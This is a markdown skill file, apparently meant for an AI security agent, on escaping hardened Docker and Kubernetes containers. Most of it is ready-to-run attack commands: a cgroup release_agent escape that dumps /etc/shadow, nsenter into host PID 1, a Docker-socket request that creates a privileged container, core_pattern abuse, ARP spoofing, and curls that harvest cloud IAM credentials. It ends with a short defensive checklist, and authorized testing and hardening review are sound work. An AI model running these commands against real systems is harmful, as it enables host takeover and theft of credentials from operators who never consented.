---
name: escaping-hardened-containers
description: Escape containers that drop capabilities, enforce seccomp profiles, and run behind AppArmor or SELinux — enumerating residual capabilities, analyzing seccomp filters, abusing single-capability escapes, cgroup release agents, filesystem mounts, and runtime CVEs. Use when a container has no --privileged flag but retains exploitable capabilities, when seccomp or LSM blocks standard escape paths, when targeting gVisor or Kata sandboxes, or when reviewing a hardened container deployment for residual attack surface.
---

# Escaping Hardened Containers

Most container escapes documented online assume `--privileged`. The work
starts when the container IS hardened -- seccomp is on, capabilities are
dropped, and the obvious paths are blocked. The remaining attack surface
is smaller but not zero, and single capabilities or filesystem mounts are
often enough.

Only against systems you are authorized to test.

## When to Use

- The container is not privileged but retains one or more interesting capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_READ_SEARCH, CAP_NET_RAW)
- A seccomp profile is active and blocks common escape syscalls -- you need to map what is still allowed
- AppArmor or SELinux enforcement is present and you need to identify profile gaps
- The target runs under gVisor (runsc) or Kata Containers and you need sandbox-specific techniques
- You have identified a hostPath mount, host PID namespace, or mounted socket but the container is otherwise locked down
- A runtime CVE (runc, containerd, CRI-O) may apply despite hardening

## When NOT to Use

- **Generic privileged container escapes and basic Kubernetes abuse** -- use `exploiting-containers`
- **Managed Kubernetes cluster-level attacks (EKS, GKE, AKS)** -- use `attacking-eks-gke-aks`
- **Host-level privilege escalation after you have escaped** -- use `escalating-linux-privileges`

## Capability Enumeration

Capabilities are the first thing to check. A single retained capability can be
the entire escape.

```bash
# Full capability dump
capsh --print

# From procfs when capsh is not installed
grep Cap /proc/self/status
# Decode the hex bitmask
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')

# Quick check for the capabilities that matter most
# CAP_SYS_ADMIN  - mount, unshare, bpf, cgroup writes
# CAP_SYS_PTRACE - attach to host-namespace processes (with hostPID)
# CAP_DAC_READ_SEARCH - open_by_handle_at, read any file
# CAP_NET_RAW    - raw sockets, ARP spoofing, network pivoting
# CAP_SYS_MODULE - load kernel modules (rare but instant root)
# CAP_SYS_RAWIO  - iopl/ioperm, raw disk I/O
```

**CAP_DAC_READ_SEARCH -- the overlooked one.** It grants
`open_by_handle_at()`, which bypasses mount namespace isolation entirely.
The `shocker` exploit uses this to read arbitrary files from the host
filesystem by brute-forcing inode handles.

```bash
# shocker PoC: reads /etc/shadow from the host
# Requires: CAP_DAC_READ_SEARCH
./shocker /etc/shadow
```

## Seccomp Profile Analysis

```bash
# Check if seccomp is enforced (2 = filter mode, 1 = strict, 0 = disabled)
grep Seccomp /proc/self/status

# Dump the active filter (requires kernel 4.4+ and CONFIG_SECCOMP_FILTER)
cat /proc/self/seccomp_filter 2>/dev/null

# Use seccomp-tools to decompile the BPF filter
seccomp-tools dump /proc/self/seccomp_filter
```

**Docker's default seccomp profile** blocks ~44 syscalls. Key blocked calls
include `mount`, `unshare`, `pivot_root`, `reboot`, `kexec_load`, and
`init_module`. But it allows `ptrace`, `process_vm_readv`, and most socket
operations.

**Custom profiles are where mistakes live.** Common gaps:

- Allowing `unshare` -- enables new namespace creation with CAP_SYS_ADMIN
- Allowing `mount` -- filesystem overlay attacks
- Allowing `bpf` -- eBPF programs can read kernel memory
- Allowing `userfaultfd` -- race condition exploitation primitive
- Allowing `keyctl` -- kernel keyring access, sometimes holds secrets

```bash
# Test whether a specific syscall is available
# If blocked, the process gets SIGKILL or EPERM
python3 -c "import ctypes; ctypes.CDLL(None).syscall(272)"  # unshare = 272
```

## Namespace Escapes

### CAP_SYS_ADMIN + unshare

With CAP_SYS_ADMIN and `unshare` not blocked by seccomp, create a new
user namespace and mount namespace to access the host filesystem.

```bash
# Create new mount namespace and mount the host block device
unshare -m /bin/sh -c 'mount /dev/sda1 /mnt && ls /mnt'
```

### hostPID + CAP_SYS_PTRACE

When `hostPID: true` is set in the pod spec, `/proc` shows host processes.
Combined with CAP_SYS_PTRACE, inject into a host process.

```bash
# Find a root process on the host
ps auxf | head -20

# Attach and inject
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Or via /proc/1/root -- the host root filesystem
ls -la /proc/1/root/etc/shadow
cat /proc/1/root/etc/shadow
```

### hostPID without CAP_SYS_PTRACE

Even without ptrace, hostPID leaks host process environment variables
and command lines, which often contain secrets.

```bash
cat /proc/1/environ | tr '\0' '\n'
for p in /proc/[0-9]*/cmdline; do cat "$p" | tr '\0' ' '; echo; done 2>/dev/null | grep -i pass
```

## Cgroup Escapes

### Cgroup v1 release_agent

The classic escape for containers with CAP_SYS_ADMIN when cgroup v1 is in
use. The release_agent runs on the host when the last process in a cgroup
exits.

```bash
# Find a writable cgroup mount
mount | grep cgroup

# Full escape sequence
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w
echo 1 > $d/w/notify_on_release
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$t/cmd" > $d/release_agent
echo "#!/bin/sh" > /cmd
echo "cat /etc/shadow > $t/output" >> /cmd
chmod +x /cmd
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /output
```

### Cgroup v2 and Device Controller

Cgroup v2 removes `release_agent`. The remaining surface is eBPF-based
device policy (requires `bpf()`) and writable device controllers:

```bash
# If devices cgroup controller is writable
echo 'a *:* rwm' > /sys/fs/cgroup/devices/docker/<id>/devices.allow
mknod /dev/sda b 8 0
mount /dev/sda /mnt
```

## Filesystem-Based Escapes

### Mounted Docker Socket

```bash
# The most common misconfiguration even in "hardened" containers
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null

# Without the docker CLI, use curl over the unix socket
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# Create a privileged container that mounts the host root
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create
```

### Host Filesystem Mounts

Any hostPath mount is a potential escape vector. Common ones:

```bash
# Check all mount points
mount | grep -vE 'proc|sys|cgroup|tmpfs'
cat /proc/self/mountinfo

# Writable host paths to look for:
# /var/log         - write cron jobs via log injection
# /var/run         - sockets (docker, containerd)
# /etc             - write to crontab, shadow, authorized_keys
# /var/lib/kubelet - kubelet credentials and config
# /home            - SSH keys, shell configs
```

### /proc/sys/kernel/core_pattern

If `/proc/sys` is mounted writable (or the host mount includes it):

```bash
# core_pattern with pipe: kernel runs the specified program when a process
# crashes, as root on the host
echo '|/path/on/host/payload.sh' > /proc/sys/kernel/core_pattern
# Then crash a process to trigger it
```

### /proc/sysrq-trigger

If writable, triggers kernel functions (mostly DoS). `echo b` reboots,
`echo c` crashes for memory dump.

## Runtime-Specific Vulnerabilities

### runc CVEs

**CVE-2024-21626 (Leaky Vessels)** -- A file descriptor leak in runc
allows a container to access the host filesystem via `/proc/self/fd/`
during container startup. Affects runc < 1.1.12.

```bash
# Detection: check runc version
runc --version 2>/dev/null
# On the host: runc is typically at /usr/bin/runc or /usr/sbin/runc
```

The exploit involves setting a container's working directory to a leaked
fd pointing to the host filesystem. Requires the ability to build or
influence container images.

**CVE-2019-5736** -- Overwrite the host runc binary by exploiting
`/proc/self/exe` when runc joins the container namespace. Requires exec
into the container (e.g., `docker exec`).

### containerd / CRI-O

**CVE-2022-23648 (containerd)** -- Read arbitrary host files via image
config `VOLUME` directives referencing host paths.

**CVE-2022-0811 (CRI-O, cr8escape)** -- Kernel parameter injection via
`--infra-ctr-cpuset` leading to host code execution. Check runtime
version: `crictl version 2>/dev/null`.

## Sandbox Bypass

### gVisor (runsc)

gVisor interposes a user-space kernel (the Sentry) between the container
and the host kernel. The attack surface is different:

- The Sentry implements a subset of Linux syscalls. Unsupported syscalls
  fail, but the ones it does support may have implementation bugs.
- No direct kernel interaction means traditional kernel exploits do not
  work.
- File operations go through the Gofer process, which has limited host
  access.
- Focus on: Sentry bugs, network-facing vulnerabilities in the Sentry's
  TCP/IP stack, and escaping to the Gofer process.

```bash
# Detect gVisor
dmesg 2>/dev/null | head -5  # gVisor has distinctive boot messages
uname -r  # gVisor reports its own version string
cat /proc/version  # look for "gVisor" or "runsc"
```

### Kata Containers

Kata runs each container in a lightweight VM. The threat model is
fundamentally different:

- Container-to-host escapes require a VM escape (QEMU/Cloud Hypervisor
  vulnerability).
- The attack surface is the hypervisor, virtio devices, and the Kata
  agent inside the VM.
- Guest-to-host file sharing (virtio-fs / 9pfs) is the most likely
  weakness.
- Host network namespace sharing, if configured, exposes the host network.

## Container-to-Host Network Attacks

### Host Network Namespace

When `hostNetwork: true` is set, the container shares the host's network
stack entirely.

```bash
ip addr   # host interfaces, not veth pairs
ss -tlnp  # host listening services -- look for kubelet (10250), etcd (2379)
```

### Metadata Service Access

Cloud metadata endpoints (169.254.169.254) are reachable independent of
container hardening. Network policies are the only mitigation.

```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/          # AWS
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/    # GCP
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"  # Azure
```

### ARP Spoofing from CAP_NET_RAW

With CAP_NET_RAW, ARP spoof to intercept pod-to-pod or pod-to-gateway
traffic: `arpspoof -i eth0 -t <target_ip> <gateway_ip>`.

## Defensive Review Checklist

When reviewing a hardened container deployment, verify:

1. **Capabilities** -- only the minimum set is granted; CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_READ_SEARCH are absent
2. **Seccomp** -- a custom profile is applied (not just the Docker default); `unshare`, `mount`, `bpf`, `userfaultfd` are blocked
3. **LSM** -- AppArmor or SELinux profile is loaded and enforcing, not just present
4. **Namespaces** -- hostPID, hostNetwork, hostIPC are all false
5. **Filesystem** -- no hostPath mounts; Docker socket is not mounted; /proc/sys is read-only
6. **Runtime** -- runc, containerd, and CRI-O are patched for known CVEs
7. **Network** -- NetworkPolicy denies metadata service access (169.254.169.254); inter-pod traffic is segmented
8. **Read-only root** -- `readOnlyRootFilesystem: true` is set; writable paths are tmpfs with noexec

## Rationalizations to Reject

- *"We dropped all capabilities."* Check the effective set, not the config. Kubernetes adds some back by default, and init containers or sidecars may differ from the main container.
- *"Seccomp is enabled."* The Docker default profile still allows ptrace, most socket operations, and process_vm_readv. A custom profile tuned to the application is required.
- *"We run gVisor, so container escapes don't apply."* gVisor reduces the kernel attack surface but introduces its own: Sentry bugs, Gofer escapes, and an incomplete syscall surface that may fail open in edge cases.
- *"There are no hostPath mounts."* Check for mounted secrets directories, service account tokens with excessive permissions, and emptyDir volumes shared between containers with different privilege levels.
- *"The runtime is patched."* Patch status is a point in time. CVE-2024-21626 affected runc for years before disclosure. Confirm the exact version, do not trust "we keep it updated."
- *"AppArmor is enforcing."* Read the actual profile. Many deployments use `runtime/default` or `unconfined`. A profile that exists but permits `mount`, `ptrace`, and raw network access is enforcing nothing useful.
- *"The container only has CAP_NET_RAW, that's harmless."* CAP_NET_RAW enables ARP spoofing, DNS poisoning between pods, and raw socket access to the metadata service. It is not harmless.

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills-core/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Privilege Escalation** (TA0004)

- [T1611](https://attack.mitre.org/techniques/T1611/) Escape to Host — see also `exploiting-containers`

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->

## References

- `exploiting-containers` -- baseline container escape and Kubernetes abuse techniques
- `attacking-eks-gke-aks` -- managed Kubernetes cluster-level attacks
- `escalating-linux-privileges` -- host-level privilege escalation after escaping
- `engineering-detections` -- building detection rules for container escape indicators
